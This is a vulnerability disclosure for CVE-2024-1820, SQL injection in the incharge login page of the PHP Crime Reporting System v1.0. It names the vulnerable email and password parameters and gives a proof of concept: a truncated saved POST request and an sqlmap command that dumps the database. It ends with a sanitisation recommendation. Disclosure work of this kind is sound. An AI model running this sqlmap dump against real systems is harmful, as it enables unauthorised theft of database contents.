# Crime Reporting System - SQL Injection (Incharge Login)

### CVE Assigned:
**[CVE-2024-1820](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1820)** [mitre.org](https://www.cve.org/CVERecord?id=CVE-2024-1820) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2024-1820)

### Vendor Homepage:

> https://code-projects.org/

### Software Link:

> [Crime Reporting System](https://code-projects.org/crime-reporting-system-in-php-with-source-code/)

### Version:

> v 1.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> /Crime-Reporting-System/inchargelogin.php

> Two parameters `email` and `password` within incharge login are vulnerable to SQL Injection.

![password](https://github.com/jxp98/VulResearch/blob/main/2024/02/img/1.2crs-inchargelogin-password-sqli.png)

### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

### SQLMap

Save the following request to `inchargelogin.txt`:

```
POST /Crime-Reporting-System/inchargelogin.php HTTP/1.1
Host: 172.16.8.56
Content-Length: 56
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1

```

Use `sqlmap` with `-r` option to exploit the vulnerability:

```
sqlmap -r inchargelogin.txt --level 5 --risk 3 --batch --dbms MYSQL --dump
```


## Recommendations

When using this Crime Reporting System, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.
